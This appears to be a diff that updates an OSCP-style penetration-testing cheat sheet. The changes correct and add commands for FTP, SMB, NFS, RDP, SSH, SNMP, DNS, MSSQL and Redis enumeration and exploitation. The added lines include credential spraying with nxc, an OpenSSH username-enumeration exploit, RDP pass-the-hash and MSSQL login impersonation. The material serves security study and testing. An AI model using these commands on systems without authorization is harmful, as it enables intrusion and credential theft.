@@ -47,6 +47,14 @@ ftp> bye
 Standard credential triad to test: `anonymous:anonymous`, `anonymous:<blank>`, `ftp:ftp`.
 Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-ftp/README.md
 
+**Faster (nxc):**
+```bash
+nxc ftp <IP> -u anonymous -p anonymous
+nxc ftp <IP> -u users.txt -p passwords.txt   # credential/anon spray across a list
+```
+NetExec ships a dedicated `ftp` protocol module (`--port`, `--ls`, `--get`, `--put`) supporting the same `-u`/`-p` credential-check pattern used for SMB/RDP/WinRM/SSH/LDAP elsewhere in this file — a one-liner equivalent of the manual anonymous-login check above.
+Source: https://raw.githubusercontent.com/Pennyw0rth/NetExec/main/nxc/protocols/ftp/proto_args.py
+
 **4. Anonymous login via browser/wget (bulk download)**
 ```bash
 wget -m ftp://anonymous:anonymous@10.10.10.98          # mirror everything, PASV
@@ -69,12 +77,12 @@ nmap -p21 --script "ftp-*" -sV <IP>
 Runs every `ftp-*` NSE script. Individually useful ones for OSCP:
 - `ftp-anon` — anonymous login + root dir listing (default category, in `-sC`)
 - `ftp-bounce` — FTP bounce PORT-scan capability check (default category, in `-sC`)
-- `ftp-syst` — sends `SYST`/`STAT`, returns raw OS/daemon info (**not** in default/vuln)
-- `ftp-brute` — brute-forces FTP creds (**intrusive**, not in default/vuln)
-- `ftp-libopie` — checks CVE-2010-1938 OPIE overflow (**not** in vuln category)
-- `ftp-vsftpd-backdoor` — tests vsFTPd 2.3.4 CVE-2011-2523 backdoor (**not** in vuln category by default in some builds — worth running explicitly)
+- `ftp-syst` — sends `SYST`/`STAT`, returns raw OS/daemon info (categories: `default,discovery,safe` — **already covered by `-sC`**, no need to run separately)
+- `ftp-brute` — brute-forces FTP creds (categories: `intrusive,brute` — not in default/vuln, the one script in this group genuinely worth an explicit run)
+- `ftp-libopie` — checks CVE-2010-1938 OPIE overflow (categories: `vuln,intrusive` — **already covered by `--script vuln`**)
+- `ftp-vsftpd-backdoor` — tests vsFTPd 2.3.4 CVE-2011-2523 backdoor (categories: `exploit,intrusive,malware,vuln` — **already covered by `--script vuln`**)
 - `ftp-proftpd-backdoor` — tests ProFTPD 1.3.3c backdoor (BID 45150)
-- `ftp-vuln-cve2010-4221` — ProFTPD 1.3.2rc3–1.3.3b stack overflow (this one IS in `vuln` category)
+- `ftp-vuln-cve2010-4221` — ProFTPD 1.3.2rc3–1.3.3b stack overflow (categories: `intrusive,vuln` — this one IS in `vuln` category)
 Source (script descriptions, verified from nmap source tree): https://github.com/nmap/nmap/tree/master/scripts (individual `.nse` files, e.g. https://raw.githubusercontent.com/nmap/nmap/master/scripts/ftp-syst.nse )
 
 **7. FTP bounce attack — manual (PORT/EPRT abuse for internal port scanning)**
@@ -127,6 +135,7 @@ Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/
 | `telnet`/`nc` | Banner grab | `telnet -vn <IP> 21` |
 | `wget` | Bulk-download anonymous FTP tree | `wget -m ftp://anonymous:anonymous@<IP>` |
 | `nmap` NSE (`ftp-*`) | Anon/bounce/backdoor/version checks | `nmap -p21 --script "ftp-*" -sV <IP>` |
+| `netexec` (nxc) | Fast anon/credential check, one-liner spray | `nxc ftp <IP> -u anonymous -p anonymous` |
 | Metasploit `ftpbounce` | Bounce-scan internal hosts | `use auxiliary/scanner/portscan/ftpbounce` |
 
 ---
@@ -225,9 +234,10 @@ Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/
 
 **9. smbclient — Kerberos auth**
 ```bash
-smbclient --kerberos //ws01win10.domain.com/C$
+smbclient --use-kerberos=required //ws01win10.domain.com/C$
 ```
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/README.md
+Samba 4.15+ replaced the standalone `--kerberos` long flag with the tri-state `--use-kerberos=desired|required|off` (`-k` is kept only as a deprecated short-flag alias); modern Kali ships well past 4.15, so bare `--kerberos` will be rejected as unrecognized.
+Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/README.md ; https://raw.githubusercontent.com/samba-team/samba/master/docs-xml/manpages/smbclient.1.xml
 
 **10. smbmap — basic + credentialed enumeration**
 ```bash
@@ -428,12 +438,13 @@ nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --rid-brute 10000   # custo
 Automates the manual `rpcclient lookupsids` loop shown above — this is nxc's built-in RID-cycling module.
 Source: https://raw.githubusercontent.com/Pennyw0rth/NetExec-Wiki/main/smb-protocol/enumeration/enumerate-users-by-bruteforcing-rid.md
 
-**29. netexec (nxc) — local groups (and note on domain groups)**
+**29. netexec (nxc) — local groups and domain groups**
 ```bash
 nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --local-groups
+nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --groups
 ```
-Note: domain-group enumeration was moved out of the SMB protocol module into the LDAP module in recent nxc versions — use `nxc ldap <target> -u u -p p --groups` for domain groups instead of an SMB flag.
-Source: https://raw.githubusercontent.com/Pennyw0rth/NetExec-Wiki/main/smb-protocol/enumeration/enumerate-local-groups.md and https://raw.githubusercontent.com/Pennyw0rth/NetExec-Wiki/main/smb-protocol/enumeration/enumerate-domain-groups.md
+`--groups` (SMB module) still enumerates domain groups directly — verified current against `nxc/protocols/smb/proto_args.py` in the NetExec source. The LDAP module also exposes its own `--groups` (`nxc ldap <target> -u u -p p --groups`) as an alternate path, not a replacement.
+Source: https://raw.githubusercontent.com/Pennyw0rth/NetExec-Wiki/main/smb-protocol/enumeration/enumerate-local-groups.md and https://raw.githubusercontent.com/Pennyw0rth/NetExec-Wiki/main/smb-protocol/enumeration/enumerate-domain-groups.md ; https://raw.githubusercontent.com/Pennyw0rth/NetExec/main/nxc/protocols/smb/proto_args.py
 
 **30. netexec (nxc) — password policy**
 ```bash
@@ -460,7 +471,7 @@ Source: https://raw.githubusercontent.com/Pennyw0rth/NetExec-Wiki/main/smb-proto
 
 **33. netexec (nxc) — the "run everything" one-liner**
 ```bash
-nxc smb <IP or domain> -u '<username>' -p '<password>' --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
+nxc smb <IP or domain> -u '<username>' -p '<password>' --groups --local-groups --loggedon-users --rid-brute --smb-sessions --users --shares --pass-pol
 ```
 Chains group, local-group, logged-on-users, RID-brute, sessions, users, shares, and password-policy modules in a single authenticated pass.
 Source: https://gist.github.com/strikoder/99635df00444bbf5fc90ca83ec8051a0 (community NXC cheat sheet; cross-check individual flags against the official wiki pages above)
@@ -629,6 +640,14 @@ showmount -e <target-ip>
 ```
 Queries mountd directly and lists every export path the host advertises plus the client ACL for each (e.g. `*`, a CIDR, or a specific host) — always run this before attempting a mount, since it also reveals which exports are world-mountable.
 Source: [2049 - Pentesting NFS Service — HackTricks](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting); [Enumerating NFS Shares (Port 2049) — Infinite Logins](https://infinitelogins.com/2020/12/12/enumerating-nfs-shares-port-2049/)
+
+**Faster (nxc):**
+```bash
+nxc nfs <target-ip> --shares          # equivalent to showmount -e
+nxc nfs <target-ip> --enum-shares     # recursively enumerate exposed shares (default depth 3)
+```
+NetExec ships a dedicated `nfs` protocol module (`--shares`, `--enum-shares`, `--ls`, `--get-file`, `--put-file`, `--chmod`) — a fast-triage alternative/companion to the manual `showmount` + mount workflow below.
+Source: https://raw.githubusercontent.com/Pennyw0rth/NetExec/main/nxc/protocols/nfs/proto_args.py
 
 **11. List currently connected/mounted clients**
 ```
@@ -892,8 +911,8 @@ Source: https://hexmos.com/freedevtools/man-pages/user-commands/file-management/
 ```
 xfreerdp /v:<ip> /u:Administrator /d:<domain> /pth:<NTHASH> /cert:ignore +clipboard /dynamic-resolution
 ```
-`/pth:` takes the NT hash (32 hex chars) directly, bypassing the cleartext password — this is CredSSP-level pass-the-hash and only works if the target still allows Restricted Admin mode (`HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin` = 0, the historical default on Server 2012R2/8.1 and many still-configured boxes). Restricted Admin was introduced in RDP 8.1 specifically as a "no cleartext password over the wire" feature and inadvertently enabled PtH.
-Source: https://unclesp1d3r.github.io/posts/2023-02-16-pth-rdp/, https://labs.portcullis.co.uk/blog/new-restricted-admin-feature-of-rdp-8-1-allows-pass-the-hash/
+`/pth:` takes the NT hash (32 hex chars) directly, bypassing the cleartext password — this is CredSSP-level pass-the-hash and only works if the target allows Restricted Admin mode (`HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin` = 0). Restricted Admin was introduced in RDP 8.1 specifically as a "no cleartext password over the wire" feature and initially shipped on by default, inadvertently enabling PtH — but Microsoft's July 8, 2014 security advisory (2973351/2975625) turned it **off** by default on Windows 8.1/Server 2012 R2 going forward (key typically absent, which means disabled). Don't assume PtH via RDP will "just work" against an unmodified 2012R2/8.1 box — it requires the DWORD to have been explicitly (mis)configured to 0 by an admin, or discovered already enabled via prior recon/foothold.
+Source: https://unclesp1d3r.github.io/posts/2023-02-16-pth-rdp/, https://labs.portcullis.co.uk/blog/new-restricted-admin-feature-of-rdp-8-1-allows-pass-the-hash/, https://support.microsoft.com/en-us/topic/microsoft-security-advisory-registry-update-to-improve-credentials-protection-and-management-for-windows-systems-that-do-not-have-the-2919355-update-installed-july-8-2014-165dab6e-2616-5b41-d0ba-747791489b7f
 
 **6. Explicit "Restricted Admin" login (no hash needed, if already privileged)**
 ```
@@ -1108,6 +1127,14 @@ SSH_AUTH_SOCK=/tmp/ssh-XXXXXXXXXX/agent.1234 ssh-add -l
 ```
 If `ForwardAgent yes` is set (globally in `/etc/ssh/ssh_config` or per-host) and a legitimate user SSHes into the box you've compromised while their agent is forwarded, their agent socket is briefly usable by anyone who can access it during that session (typically requires matching the connecting user's UID, but root or a misconfigured socket permission can expose it) — letting you authenticate to every host their key is trusted on without ever exfiltrating the private key itself. Always check `$SSH_AUTH_SOCK`/`ssh-add -l` immediately after landing a shell.
 Source: https://en.wikipedia.org/wiki/Ssh-agent ; https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration#ssh-agent-forwarding-abuse
+
+**29c. Pre-auth username enumeration — CVE-2018-15473 (OpenSSH < 7.7)**
+```
+git clone https://github.com/Rhynorater/CVE-2018-15473-Exploit
+python3 sshUsernameEnumExploit.py --userList users.txt <ip> [--port 22]
+```
+Sends a malformed `SSH2_MSG_USERAUTH_REQUEST` (authenticating via a crafted public-key packet) and times the server's response: a valid username causes OpenSSH to check the key against `authorized_keys` before rejecting (slower), an invalid one is rejected immediately (faster) — a pre-auth timing oracle for username discovery against builds before the 7.7 fix. Affects OpenSSH 2.3–7.7 inclusive. nxc's `ssh` module has no built-in equivalent (its flags are limited to `--key-file`/`--sudo-check`/`-x`), so this is a standalone technique.
+Source: https://www.exploit-db.com/exploits/45939, https://github.com/Rhynorater/CVE-2018-15473-Exploit
 
 **30. netexec SSH module (credential/key spraying)**
 ```
@@ -1455,10 +1482,10 @@ Source: [Enumerating SNMP for Pentesting — Infinite Logins](https://infinitelo
 
 **Useful OID — storage/mounted filesystems**
 ```
-snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.2.3.1.4
+snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.2.3.1.3
 ```
-`hrStorageDescr` — lists disk partitions/mount points and (via sibling columns `.5`/`.6`) their allocation units and size, useful for recon of disk layout before further exploitation.
-Source: [useful SNMP OIDs — Medium](https://joelzhang.medium.com/useful-snmp-oids-5a6c773ccdd0)
+`hrStorageDescr` (HOST-RESOURCES-MIB `hrStorageEntry` column 3) — lists disk partitions/mount points; combine with sibling columns `.4`/`.5`/`.6` (`hrStorageAllocationUnits`/`hrStorageSize`/`hrStorageUsed`) for allocation units and size, useful for recon of disk layout before further exploitation.
+Source: [useful SNMP OIDs — Medium](https://joelzhang.medium.com/useful-snmp-oids-5a6c773ccdd0); RFC 2790 (HOST-RESOURCES-MIB `hrStorageEntry` SEQUENCE)
 
 **Useful OID — network interfaces / IP addresses**
 ```
@@ -1470,10 +1497,10 @@ Source: [Common OIDs Of SNMP — LuLeey](https://www.luleey.com/common-oids-of-s
 
 **Useful OID — listening/established TCP connections**
 ```
-snmpwalk -v2c -c public <target> 1.3.6.1.2.1.6.13.1.3
+snmpwalk -v2c -c public <target> 1.3.6.1.2.1.6.13.1.1
 ```
-`tcpConnState`/`tcpConnTable` (TCP-MIB) — effectively a remote `netstat`, revealing internal-only listening services not reachable/visible from your scanning position.
-Source: [useful SNMP OIDs — Medium](https://joelzhang.medium.com/useful-snmp-oids-5a6c773ccdd0)
+`tcpConnState`/`tcpConnTable` (RFC1213-MIB `tcpConnEntry` column 1; walk `1.3.6.1.2.1.6.13.1` for the whole table) — effectively a remote `netstat`, revealing internal-only listening services not reachable/visible from your scanning position.
+Source: [useful SNMP OIDs — Medium](https://joelzhang.medium.com/useful-snmp-oids-5a6c773ccdd0); RFC 1213 (`tcpConnEntry` SEQUENCE)
 
 **Useful OID — Windows local user accounts (legacy LAN Manager MIB)**
 ```
@@ -1653,7 +1680,7 @@ dnsrecon -r 10.11.1.1-10.11.1.254
 dnsrecon -r 10.11.1.0/24
 ```
 **Explanation:** `-r` performs PTR (reverse) lookups across an IP range or CIDR block, useful for sweeping an internal subnet for hostnames that reveal roles (e.g., `dc01.corp.local`, `mail.corp.local`).
-**Source:** https://raw.githubusercontent.com/darkoperator/dnsrecon (README description of `-r` reverse-lookup capability)
+**Source:** https://raw.githubusercontent.com/darkoperator/dnsrecon/master/README.md (README description of `-r` reverse-lookup capability)
 
 ### 11. `dnsrecon` — SRV record enumeration (AD-relevant)
 **Command:**
@@ -1748,10 +1775,10 @@ host 10.11.1.5
 ### 22. Reverse DNS sweep across a subnet with Nmap
 **Command:**
 ```bash
-nmap -sL -n 10.11.1.0/24
+nmap -sL 10.11.1.0/24
 ```
-**Explanation:** Nmap's list scan (`-sL`) performs no port scanning at all — it just does reverse-DNS resolution for every host in the range, giving a fast bulk PTR sweep as an alternative to looping `dig -x`/`host` per address.
-**Source:** https://www.howtouselinux.com/post/reverse-dns-lookup (general reverse-lookup technique reference)
+**Explanation:** Nmap's list scan (`-sL`) performs no port scanning at all — it just does reverse-DNS resolution for every host in the range by default, giving a fast bulk PTR sweep as an alternative to looping `dig -x`/`host` per address. Do **not** add `-n` here — `-n` disables all DNS resolution and would defeat the entire point of `-sL` (per nmap's own docs, `-sL -n` prints targets with no DNS lookups at all).
+**Source:** https://www.howtouselinux.com/post/reverse-dns-lookup (general reverse-lookup technique reference); https://nmap.org/book/host-discovery-list-scan.html
 
 ### 23. AD domain controller discovery via LDAP SRV record
 **Command:**
@@ -2034,6 +2061,9 @@ REVERT;
 If the current login has `IMPERSONATE` rights on a higher-privileged login (commonly `sa`), `EXECUTE AS LOGIN` elevates the session's effective server role to sysadmin without a password; `REVERT` drops back.
 Source: [NetSPI — Hacking SQL Server Stored Procedures: User Impersonation](https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-stored-procedures-part-2-user-impersonation/), [HackTricks — Abusing AD MSSQL](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-mssql)
 
+`mssqlclient.py` built-in shortcut (same SQL_SHELL used for `enum_links`/`use_link` above): `exec_as_login {login}` / `exec_as_user {user}` runs the equivalent `EXECUTE AS LOGIN`/`EXECUTE AS USER` directly from the prompt, e.g. `SQL> exec_as_login sa`.
+Source: [impacket/impacket/examples/mssqlshell.py](https://github.com/fortra/impacket/blob/master/impacket/examples/mssqlshell.py)
+
 **Faster (nxc):** the `mssql_priv` check module enumerates and exploits impersonation-based privesc (including chained `EXECUTE AS`) without hand-writing the SQL above:
 ```
 nxc mssql <target-ip> -u <user> -p <pass> -M mssql_priv
@@ -2047,7 +2077,7 @@ Source: [NetExec-Wiki — mssql-protocol modules](https://github.com/Pennyw0rth/
 | `sqlcmd` | Native MS client, alternate manual query execution |
 | PowerUpSQL (`Get-SQLServerLink`, `Get-SQLServerLinkCrawl`) | Windows-side automated linked-server crawling/RCE chaining |
 | `xp_cmdshell` | Built-in extended proc for OS command execution |
-| Metasploit `mssql_*` modules | Automated login brute-force, `xp_cmdshell` enabling |
+| Metasploit `mssql_*` modules | Automated login brute-force, `xp_cmdshell` enabling. **Exam caveat: like all Metasploit modules, restricted to the single machine you've designated for Metasploit use on exam day — `mssqlclient.py`/manual `xp_cmdshell` enabling above are the exam-safe, reusable alternative.** |
 
 ---
 
@@ -2252,7 +2282,7 @@ Source: [xmsec/redis-ssrf (GitHub)](https://github.com/xmsec/redis-ssrf), [Paylo
 | `redis-cli` | Native interactive/one-shot Redis client |
 | `gopherus` | Generates gopher:// payloads to weaponize SSRF into blind Redis RCE |
 | `redis-ssh` (LevitatingBusinessMan) | Automates the authorized_keys injection chain |
-| Metasploit `redis_file_upload` / `redis_login` | Automated auth brute-force and file-write exploitation |
+| Metasploit `auxiliary/scanner/redis/file_upload` / `auxiliary/scanner/redis/redis_login` | Automated auth brute-force and file-write exploitation. **Exam caveat: like all Metasploit modules, restricted to the single machine you've designated for Metasploit use on exam day — the manual `CONFIG SET`/`SAVE` technique above is the exam-safe, reusable default.** |
 
 ---
 
